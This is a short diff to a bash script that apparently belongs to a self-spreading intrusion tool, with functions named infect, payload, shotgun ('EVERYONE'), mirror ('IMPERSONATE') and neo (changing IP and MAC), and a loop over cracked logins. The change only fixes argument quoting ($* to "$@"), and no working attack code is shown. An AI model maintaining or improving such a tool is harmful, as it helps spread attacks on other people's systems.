@@ -22,7 +22,7 @@
 function main(){		###
 	#neo				###
 	#meat				###
-	infect $*			###
+	infect "$@"			###
 	#mutate				### "RANDOMIZE"
 	#mirror				### IMPERSONATE
 	#molt				### ORIGINAL CONFIG
@@ -44,7 +44,7 @@ function main(){		###
 function infect(){
 #### launch bay #########
 function payload(){		#
-#	razor $*			# SINGLE TARGET
+#	razor "$@"			# SINGLE TARGET
 	shotgun				# EVERYONE
 }						#
 #########################
@@ -179,7 +179,7 @@ function payload(){		#
 			esac
 		done <<< $(sort -u $crackedLogins | sed '/^$/d')
 	}
-payload $*
+payload "$@"
 }
 ###########################################################################################
 # if called; changes ip, mac, etc
@@ -245,4 +245,4 @@ function neo(){
 #+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-main $*
+main "$@"
